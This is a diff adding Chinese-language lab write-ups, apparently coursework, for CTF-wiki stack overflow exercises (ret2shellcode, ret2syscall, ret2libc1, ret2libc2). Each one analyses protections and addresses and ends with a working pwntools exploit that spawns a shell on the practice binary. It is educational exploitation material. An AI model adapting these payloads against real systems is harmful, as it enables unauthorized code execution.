@@ -138,3 +138,278 @@ sh.interactive()
 
 # ret2shellcode
 
+## 检查安全机制
+
+checksec检查结果：
+
+![image-20230416101443847](md.image/report/image-20230416101443847.png)
+
+发现几乎没有开启任何防护，且具有可读可写可执行的段
+
+## 程序分析
+
+IDA反汇编，发现溢出点，而且会把读入的数据拷贝到`buf2`
+
+![image-20230416102201220](md.image/report/image-20230416102201220.png)
+
+检查`buf2`，得知是在.bss段上，地址是0x0804A080
+
+![image-20230416102304987](md.image/report/image-20230416102304987.png)
+
+同时经过检查程序，发现这次并没有提供诸如`system('\bin\sh')`这样能直接getshell的语句。因此需要考虑自己将shellcode写入内存中。根据上述分析，则期望.bss段就是其中一个可读可写可执行的段，如果能把shellcode通过`s`写入到这里，则再把`main`函数的返回地址覆盖成我们在.bss段写入的shellcode地址，即可getshell
+
+> 但是程序本身并没有开启NX防护措施，理论上可以直接在栈上写入NOP+shellcode，再把`main`的返回地址覆盖到栈中的我们填入的其中一个NOP的位置即可
+
+gdb调试，`b main`在`main`函数处下断点，`r`运行程序，`vmmap`检查程序地址段信息，检查程序.bss段属性，发现只是“rw-”，并没有可执行权限
+
+![image-20230416104658713](md.image/report/image-20230416104658713.png)
+
+>这里课上老师讲过，CTF-wiki上的题目有点问题，需要自己手动编辑这个可执行文件，使.bss段权限变成“rwx”。于是下面就使用修改好后的题目进行解题
+
+换成修复后的题目进行解题，重新检查程序地址段信息，此时.bss段的权限为“rwx”
+
+![image-20230416125828143](md.image/report/image-20230416125828143.png)
+
+根据上题经验，在`gets`函数处下断点，通过`$eax`获取`s`的地址，得到`s`的的地址为0xffffd56c，`$ebp`的地址为0xffffd5d8
+
+![image-20230416130735639](md.image/report/image-20230416130735639.png)
+
+这时候就可以构造如下栈结构，使得`main`函数结束时跳转到我们在.bss段写入的shellcode地址：
+
+![ret2shellcode](md.image/report/ret2shellcode.png)
+
+## payload
+
+```python
+from pwn import *
+import pwnlib.util.packing
+
+context(os='linux', arch='i386')
+
+sh = process("./ret2shellcode_fix")
+
+addr_buf2 = 0x0804A080
+addr_ebp = 0xffffd5d8
+addr_s = 0xffffd56c
+
+shellcode = asm(shellcraft.sh())
+
+len_ebp = addr_ebp - addr_s
+
+payload = shellcode.ljust(len_ebp+0x04, b'a') + packing.p32(addr_buf2)
+
+sh.sendline(payload)
+sh.interactive()
+```
+
+# ret2syscall
+
+## 检查安全机制
+
+checksec检查一下，发现开启了NX保护，这一次也没有显示有“rwx”权限的段了
+
+![1681628756133](md.image/report/1681628756133.png)
+
+## 程序分析
+
+IDA反汇编，发现变量`v4`依旧使用`gets`函数，存在溢出漏洞
+
+![image-20230416151110797](md.image/report/image-20230416151110797.png)
+
+检查寻址方式，还是通过`$esp`寻址
+
+![image-20230416151301882](md.image/report/image-20230416151301882.png)
+
+因此同第一题一样，在0x08048E96处下断点在`$eax`中获取`v4`的位置，得到`v4`的地址是0xffffd5cc，`$ebp`的地址是0xffffd638
+
+![image-20230416151428141](md.image/report/image-20230416151428141.png)
+
+下面就是要考虑要把`main`的返回地址覆盖成什么才能getshell。由于这次我们不能直接在程序内存中写入自己的shellcode，因此需要考虑利用程序中已有的代码片段（称为gadget），再根据系统调用的特点，来拼凑出能getshell的代码。举个例子，如果需要执行`execve('/bin/sh', NULL, NULL)`，则需要寄存器满足以下条件：
+
+* `$eax`=0x0b
+* `$ebx`='/bin/sh'的地址
+* `$ecx`=0
+* `$edx`=0
+
+之后再执行`int 0x80`，程序就会执行`execve('/bin/sh', NULL, NULL)`。所以下面的目标就是找出程序中一些pop-ret语句的地址结合要放入的数据按特定顺序填入到栈中，即可控制程序执行流分段式地形成我们想要的寄存器布局，从而getshell
+
+利用ROPgadget工具查找能控制`$eax`的gadget，这里选择地址为0x080bb196的gadget
+
+![image-20230416171144174](md.image/report/image-20230416171144174.png)
+
+同样查找能控制`$ebx`的gadget，这里选择地址0x0806eb90，因为它能同时控制`$ebx`、`$ecx`、`$edx`
+
+![image-20230416171331129](md.image/report/image-20230416171331129.png)
+
+查找一下程序中有没有提供“/bin/sh”字串，发现0x080be408
+
+![image-20230416171620990](md.image/report/image-20230416171620990.png)
+
+最后查找能执行`int 0x80`指令的地址，得到0x08049421
+
+![image-20230416171901764](md.image/report/image-20230416171901764.png)
+
+最后构造如下的栈结构和寄存器布局：
+
+![ret2syscall](md.image/report/ret2syscall.png)
+
+## payload
+
+```python
+from pwn import *
+from pwnlib.util.packing import p32
+
+sh = process("./rop")
+
+addr_v4 = 0xffffd5cc
+addr_ebp = 0xffffd638
+len_ebp = addr_ebp - addr_v4
+
+addr_pop_eax = 0x080bb196
+addr_pop_edx_ecx_ebx = 0x0806eb90
+addr_sh = 0x080be408
+addr_int_0x80 = 0x08049421
+
+payload = (b'a'*len_ebp + b'bbbb' \
+        + p32(addr_pop_eax) + p32(0x0b) \
+        + p32(addr_pop_edx_ecx_ebx) + p32(0x00) + p32(0x00) + p32(addr_sh) \
+        + p32(addr_int_0x80))
+
+sh.sendline(payload)
+sh.interactive()
+```
+
+执行结果如下：
+
+![image-20230416175310265](md.image/report/image-20230416175310265.png)
+
+# ret2libc1
+
+## 检查安全机制
+
+checksec检查，发现也是开启了NX保护，也没有有“rwx”权限的段
+
+![image-20230416191236295](md.image/report/image-20230416191236295.png)
+
+## 程序分析
+
+IDA反汇编，确认到溢出点在`s`上
+
+![image-20230416191353005](md.image/report/image-20230416191353005.png)
+
+动态调试出`s`以及`$ebp`的地址分别为0xffffd58c、0xffffd5f8
+
+![image-20230416191607607](md.image/report/image-20230416191607607.png)
+
+同时也发现了程序的`secure`函数调用了.ptl表中的`system`
+
+![image-20230416193307752](md.image/report/image-20230416193307752.png)
+
+地址为0x08048460
+
+![image-20230416193327965](md.image/report/image-20230416193327965.png)
+
+尝试在程序中搜索是否有现成的“/bin/sh”，也发现了它的地址是0x08048720，很巧合
+
+![image-20230416193608938](md.image/report/image-20230416193608938.png)
+
+libc6-i386.so中的`system`函数通过[`$esp`]+0x04的地址进行传参，因此可以构造出下列栈结构进行getshell：
+
+![ret2libc1](md.image/report/ret2libc1.png)
+
+## payload
+
+```python
+from pwn import *
+from pwnlib.util.packing import p32
+
+sh = process("./ret2libc1")
+
+addr_s = 0xffffd58c
+addr_ebp = 0xffffd5f8
+len_ebp = addr_ebp - addr_s
+
+addr_system = 0x08048460
+addr_sh = 0x08048720
+
+payload = b'a'*len_ebp + b'bbbb' + p32(addr_system) + b'cccc' + p32(addr_sh)
+
+sh.sendline(payload)
+sh.interactive()
+```
+
+执行结果如下：
+
+![image-20230416194709985](md.image/report/image-20230416194709985.png)
+
+# ret2libc2
+
+## 检查安全机制
+
+checksec检查，发现也是开启了NX保护，也没有有“rwx”权限的段
+
+![image-20230416202953504](md.image/report/image-20230416202953504.png)
+
+## 程序分析
+
+IDA反汇编，确认到溢出点在`s`上
+
+![image-20230416203043223](md.image/report/image-20230416203043223.png)
+
+动态调试出`s`以及`$ebp`的地址分别为0xffffd58c、0xffffd5f8
+
+![image-20230416203147198](md.image/report/image-20230416203147198.png)
+
+同时也发现了程序的`secure`函数调用了.ptl表中的`system`，地址为0x08048490
+
+![image-20230416203338634](md.image/report/image-20230416203338634.png)
+
+尝试在程序中搜索是否有现成的“/bin/sh”，但这次并没有找到，因此需要自己在程序内存中的某个位置写入“/bin/sh”。使用gdb的vmmap命令查看段信息，考虑使用0x0804a000这个内存位置
+
+![image-20230416203712443](md.image/report/image-20230416203712443.png)
+
+在IDA中检查这个位置，发现是.bss段，而且存在一个名为`buf2`的缓冲区，地址是0x0804A080
+
+![image-20230416203841460](md.image/report/image-20230416203841460.png)
+
+这里考虑重复利用程序已用的`gets`函数往`buf2`写“/bin/sh”，查看`gets`函数在.ptl中的地址，是0x08048460
+
+![image-20230416204310072](md.image/report/image-20230416204310072.png)
+
+`gets`函数写入地址的参数位置也在[`$esp`]+0x04。但由于调用完`gets`之后，返回的地址能越过`gets`的参数去执行`system`，因此需要保持栈平衡。这里则考虑随便使用一个pop单个寄存器的gadget，比如下面的`pop ebx; ret`，地址是0x0804843d，这样就能跳过`gets`的参数地址
+
+![image-20230416205038116](md.image/report/image-20230416205038116.png)
+
+由此构造出栈结构如下：
+
+![ret2libc2](md.image/report/ret2libc2.png)
+
+## payload
+
+```python
+from pwn import *
+from pwnlib.util.packing import p32
+
+sh = process("./ret2libc2")
+
+addr_s = 0xffffd58c
+addr_ebp = 0xffffd5f8
+len_ebp = addr_ebp - addr_s
+
+addr_system = 0x08048490
+addr_gets = 0x08048460
+addr_buf2 = 0x0804a080
+addr_pop_ebx = 0x0804843d
+
+payload = (b'a'*len_ebp + b'bbbb' \
+        + p32(addr_gets) + p32(addr_pop_ebx)  + p32(addr_buf2) \
+        + p32(addr_system) + b'cccc' + p32(addr_buf2))
+
+sh.sendline(payload)
+sh.sendline('/bin/sh')
+sh.interactive()
+```
+
+执行结果如下：
+
+![image-20230416210354058](md.image/report/image-20230416210354058.png)
